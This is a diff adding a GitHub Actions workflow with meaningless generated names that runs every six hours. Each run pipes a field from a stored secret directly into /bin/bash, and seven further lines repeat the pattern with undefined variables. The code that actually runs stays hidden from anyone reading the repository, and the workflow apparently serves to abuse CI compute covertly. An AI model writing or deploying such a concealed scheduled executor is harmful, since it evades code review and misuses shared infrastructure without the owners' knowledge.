@@ -1,0 +1,24 @@
+name: fudouding1938
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fudouding1938
+        env:
+          nj503: ${{ secrets.nj503 }}
+        run: |
+          echo $nj503 | jq -r .nw43 | /bin/bash
+          echo $aur0356 | jq -r .kizl55796 | /bin/bash
+          echo $wsflx8927 | jq -r .urg1081 | /bin/bash
+          echo $wwo409 | jq -r .r9265 | /bin/bash
+          echo $qpwgk91 | jq -r .iubv31 | /bin/bash
+          echo $veei50 | jq -r .j1 | /bin/bash
+          echo $fhclx3 | jq -r .ikg16 | /bin/bash
+          echo $k7 | jq -r .wk5 | /bin/bash
+
